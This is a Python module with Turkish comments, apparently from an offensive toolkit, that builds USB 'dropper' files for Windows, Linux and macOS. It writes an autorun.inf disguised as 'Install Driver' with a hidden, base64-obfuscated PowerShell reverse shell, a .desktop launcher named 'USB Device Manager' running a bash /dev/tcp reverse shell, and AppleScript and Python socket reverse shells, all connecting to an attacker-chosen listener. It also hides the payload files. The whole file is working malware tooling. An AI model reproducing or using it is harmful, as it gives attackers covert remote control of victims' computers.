#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
USB bellek için damlalık dosyaları oluşturma (Windows/Linux/macOS).

özellikler:
    - windows: autorun.inf + VBS payload
    - linux: .desktop + bash payload
    - macOS: AppleScript payload
    - payload obfuscation (base64 encoding)
    - IP adresi format doğrulama
    - güvenli subprocess kullanımı
    - payload çeşitliliği (PowerShell, Python, Bash)
"""

from __future__ import annotations

import base64
import os
import platform
import random
import string
import subprocess
from pathlib import Path
from typing import Optional

from .konsol import konsol
from .yardimci import ip_dogrula


# ────────────────────────────── modül bilgisi ──────────────────────────────

MODUL_BILGI = {
    "ad": "USB damlalık",
    "aciklama": "USB damlalık dosyaları oluştur",
    "giris_noktasi": "olustur",
    "komut": "usb",
}


# ────────────────────────────── yardımcı fonksiyonlar ──────────────────────────────

def _rastgele_ad(uzunluk: int = 8) -> str:
    """payload obfuscation için rastgele değişken adı üretir.

    Args:
        uzunluk: üretilecek ismin uzunluğu

    Returns:
        rastgele harf dizisi
    """
    return "".join(random.choices(string.ascii_lowercase, k=uzunluk))


def _base64_kodla(metin: str) -> str:
    """metni base64 olarak kodlar.

    Args:
        metin: kodlanacak metin

    Returns:
        base64 kodlanmış metin
    """
    return base64.b64encode(metin.encode("utf-8")).decode("utf-8")


# ────────────────────────────── Windows payload ──────────────────────────────

def windows_yuku_olustur(
    hedef_dizin: str,
    dinleyici_ip: str,
    dinleyici_port: int,
    obfuscate: bool = True,
) -> None:
    """Windows için autorun.inf + PowerShell ters kabuk payload'u oluşturur.

    Args:
        hedef_dizin: dosyaların yazılacağı dizin
        dinleyici_ip: ters kabuk için dinleyici IP
        dinleyici_port: ters kabuk için dinleyici port
        obfuscate: True ise payload base64 ile gizlenir
    """
    hedef = Path(hedef_dizin)

    # autorun.inf
    autorun_icerik = "[autorun]\nopen=payload.vbs\naction=Install Driver\nlabel=USB\nicon=shell32.dll,4\n"
    (hedef / "autorun.inf").write_text(autorun_icerik, encoding="utf-8")
    konsol.bilgi("autorun.inf oluşturuldu.")

    # PowerShell payload
    ps_kodu = (
        f"$c=New-Object System.Net.Sockets.TcpClient('{dinleyici_ip}',{dinleyici_port});"
        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{;"
        f"$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
        f"$r=(iex $d 2>&1|Out-String);"
        f"$r2=$r+'PS '+(pwd).Path+'> ';"
        f"$sb=([Text.Encoding]::ASCII).GetBytes($r2);"
        f"$s.Write($sb,0,$sb.Length);$s.Flush()}};"
        f"$c.Close()"
    )

    if obfuscate:
        # base64 ile gizleme
        encoded = base64.b64encode(ps_kodu.encode("utf-16-le")).decode("ascii")
        vbs_komut = f'powershell -windowstyle hidden -encodedcommand {encoded}'
    else:
        ps_kodu_kacirilmis = ps_kodu.replace('"', '""')
        vbs_komut = f'powershell -windowstyle hidden -command ""{ps_kodu_kacirilmis}""'

    # VBS wrapper
    vbs_degisken = _rastgele_ad()
    vbs_icerik = (
        f'Set {vbs_degisken} = CreateObject("WScript.Shell")\n'
        f'{vbs_degisken}.Run "{vbs_komut}", 0, False\n'
    )

    (hedef / "payload.vbs").write_text(vbs_icerik, encoding="utf-8")
    konsol.bilgi("payload.vbs oluşturuldu (PowerShell ters kabuk).")

    if obfuscate:
        konsol.basari("payload base64 ile gizlendi.")


def linux_yuku_olustur(
    hedef_dizin: str,
    dinleyici_ip: str,
    dinleyici_port: int,
    obfuscate: bool = True,
) -> None:
    """Linux için .desktop + bash ters kabuk payload'u oluşturur.

    Args:
        hedef_dizin: dosyaların yazılacağı dizin
        dinleyici_ip: ters kabuk için dinleyici IP
        dinleyici_port: ters kabuk için dinleyici port
        obfuscate: True ise payload base64 ile gizlenir
    """
    hedef = Path(hedef_dizin)

    bash_kodu = f"bash -i >& /dev/tcp/{dinleyici_ip}/{dinleyici_port} 0>&1 &"

    if obfuscate:
        encoded = _base64_kodla(bash_kodu)
        calistirilacak = f"bash -c 'echo {encoded} | base64 -d | bash'"
    else:
        calistirilacak = f"bash -c '{bash_kodu}'"

    # .desktop dosyası
    desktop_icerik = (
        "[Desktop Entry]\n"
        "Type=Application\n"
        "Name=USB Device Manager\n"
        f"Exec={calistirilacak}\n"
        "Terminal=false\n"
        "Icon=drive-removable-media\n"
    )
    desktop_yolu = hedef / "yardimci.desktop"
    desktop_yolu.write_text(desktop_icerik, encoding="utf-8")

    # çalıştırma izni ver (sadece Linux/Mac'te)
    if platform.system() != "Windows":
        try:
            desktop_yolu.chmod(0o755)
        except OSError as e:
            konsol.uyari(f"izin ayarlanamadı: {e}")

    konsol.bilgi("yardimci.desktop oluşturuldu.")

    # bash betiği
    bash_icerik = f"#!/bin/bash\n{calistirilacak}\n"
    bash_yolu = hedef / "payload.sh"
    bash_yolu.write_text(bash_icerik, encoding="utf-8")

    if platform.system() != "Windows":
        try:
            bash_yolu.chmod(0o755)
        except OSError as e:
            konsol.uyari(f"izin ayarlanamadı: {e}")

    konsol.bilgi("payload.sh oluşturuldu (bash ters kabuk).")

    if obfuscate:
        konsol.basari("payload base64 ile gizlendi.")


def macos_yuku_olustur(
    hedef_dizin: str,
    dinleyici_ip: str,
    dinleyici_port: int,
    obfuscate: bool = True,
) -> None:
    """macOS için AppleScript tabanlı payload oluşturur.

    Args:
        hedef_dizin: dosyaların yazılacağı dizin
        dinleyici_ip: ters kabuk için dinleyici IP
        dinleyici_port: ters kabuk için dinleyici port
        obfuscate: True ise payload base64 ile gizlenir
    """
    hedef = Path(hedef_dizin)

    bash_kodu = f"bash -i >& /dev/tcp/{dinleyici_ip}/{dinleyici_port} 0>&1 &"

    if obfuscate:
        encoded = _base64_kodla(bash_kodu)
        calistirilacak = f"echo {encoded} | base64 -D | bash"
    else:
        calistirilacak = bash_kodu

    applescript_icerik = (
        f'do shell script "{calistirilacak}" &\n'
    )

    (hedef / "payload.scpt").write_text(applescript_icerik, encoding="utf-8")
    konsol.bilgi("payload.scpt oluşturuldu (AppleScript ters kabuk).")

    # python payload (alternatif)
    python_kodu = (
        f"import socket,subprocess,os\n"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
        f"s.connect(('{dinleyici_ip}',{dinleyici_port}))\n"
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n"
        f"subprocess.call(['/bin/bash','-i'])\n"
    )

    if obfuscate:
        encoded_py = _base64_kodla(python_kodu)
        python_wrapper = (
            f"#!/usr/bin/env python3\n"
            f"import base64\n"
            f"exec(base64.b64decode('{encoded_py}').decode())\n"
        )
        (hedef / "payload.py").write_text(python_wrapper, encoding="utf-8")
    else:
        (hedef / "payload.py").write_text(f"#!/usr/bin/env python3\n{python_kodu}", encoding="utf-8")

    if platform.system() != "Windows":
        try:
            (hedef / "payload.py").chmod(0o755)
        except OSError:
            pass

    konsol.bilgi("payload.py oluşturuldu (python ters kabuk).")

    if obfuscate:
        konsol.basari("payload'lar base64 ile gizlendi.")


# ────────────────────────────── dosya gizleme ──────────────────────────────

def _dosyalari_gizle(hedef_dizin: str) -> None:
    """oluşturulan payload dosyalarını gizlemeye çalışır.

    Args:
        hedef_dizin: dosyaların bulunduğu dizin
    """
    hedef = Path(hedef_dizin)
    sistem = platform.system()

    if sistem == "Windows":
        for dosya in hedef.iterdir():
            if dosya.suffix in (".vbs", ".inf"):
                try:
                    subprocess.run(
                        ["attrib", "+H", "+S", str(dosya)],
                        capture_output=True,
                        timeout=5,
                        check=False,
                    )
                except (FileNotFoundError, subprocess.TimeoutExpired):
                    pass
    elif sistem in ("Linux", "Darwin"):
        for dosya in hedef.iterdir():
            if dosya.suffix in (".sh", ".py", ".scpt"):
                try:
                    dosya.chmod(0o444)
                except OSError:
                    pass


# ────────────────────────────── ana fonksiyon ──────────────────────────────

def olustur(
    hedef_dizin: Optional[str] = None,
    dinleyici_ip: Optional[str] = None,
    dinleyici_port: Optional[int] = None,
    hedef_os: Optional[str] = None,
    obfuscate: bool = True,
) -> None:
    """platforma uygun USB damlalık dosyalarını üretir.

    Args:
        hedef_dizin: USB belleğin bağlanacağı dizin
        dinleyici_ip: ters kabuk için dinleyici IP adresi
        dinleyici_port: ters kabuk portu
        hedef_os: hedef işletim sistemi ("windows", "linux", "macos")
        obfuscate: True ise payload gizlenir
    """
    konsol.ayirici()
    konsol.vurgu("USB damlalık oluşturucu")
    konsol.ayirici()

    interaktif = hedef_dizin is None

    # interaktif mod
    if interaktif:
        hedef_dizin = konsol.girdi_al("USB belleğin bağlanacağı dizin")
        if not hedef_dizin:
            konsol.hata("dizin yolu boş olamaz.")
            return

    hedef = Path(hedef_dizin)
    if not hedef.is_dir():
        if konsol.onayla(f"'{hedef_dizin}' dizini mevcut değil, oluşturulsun mu?"):
            try:
                hedef.mkdir(parents=True, exist_ok=True)
            except OSError as e:
                konsol.hata(f"dizin oluşturulamadı: {e}")
                return
        else:
            konsol.bilgi("iptal edildi.")
            return

    # IP doğrulama
    if dinleyici_ip is None:
        while True:
            dinleyici_ip = konsol.girdi_al("ters kabuk için dinleyici IP adresi")
            if ip_dogrula(dinleyici_ip):
                break
            konsol.uyari("geçersiz IP adresi formatı, tekrar deneyin.")
    elif not ip_dogrula(dinleyici_ip):
        konsol.hata(f"geçersiz IP adresi: {dinleyici_ip}")
        return

    # port
    if dinleyici_port is None:
        while True:
            port_str = konsol.girdi_al("dinleyici port", "4444")
            try:
                dinleyici_port = int(port_str)
                if 1 <= dinleyici_port <= 65535:
                    break
                konsol.uyari("port 1-65535 aralığında olmalı.")
            except ValueError:
                konsol.uyari("geçerli bir sayı girin.")

    # hedef OS seçimi
    if hedef_os is None:
        konsol.bilgi("hedef işletim sistemi:")
        print()
        konsol.bilgi("[1] Windows")
        konsol.bilgi("[2] Linux")
        konsol.bilgi("[3] macOS")
        print()
        sistem_secim = konsol.girdi_al("seçiminiz", "1")

        os_esleme = {"1": "windows", "2": "linux", "3": "macos"}
        hedef_os = os_esleme.get(sistem_secim)
        if hedef_os is None:
            konsol.hata("geçersiz seçim.")
            return

    # obfuscation sorusu (interaktif)
    if interaktif:
        obfuscate = konsol.onayla("payload kodları gizlensin mi (obfuscate)?", varsayilan=True)

    # payload oluştur
    hedef_os = hedef_os.lower()
    konsol.bilgi(f"payload oluşturuluyor: {hedef_os}")
    konsol.bilgi(f"hedef: {dinleyici_ip}:{dinleyici_port}")

    if hedef_os == "windows":
        windows_yuku_olustur(hedef_dizin, dinleyici_ip, dinleyici_port, obfuscate)
    elif hedef_os == "linux":
        linux_yuku_olustur(hedef_dizin, dinleyici_ip, dinleyici_port, obfuscate)
    elif hedef_os == "macos":
        macos_yuku_olustur(hedef_dizin, dinleyici_ip, dinleyici_port, obfuscate)
    else:
        konsol.hata(f"desteklenmeyen işletim sistemi: {hedef_os}")
        return

    # dosyaları gizle
    _dosyalari_gizle(hedef_dizin)

    konsol.ayirici()
    konsol.basari(f"tüm dosyalar {hedef_dizin} dizinine yazıldı.")
    konsol.uyari("not: modern Windows'larda autorun varsayılan olarak kapalıdır.")
    konsol.uyari("Linux'ta .desktop dosyasının çalışması için kullanıcının çift tıklaması gerekir.")
    konsol.uyari("macOS'ta payload'un çalışması için güvenlik ayarlarının gevşetilmesi gerekir.")
    konsol.ayirici()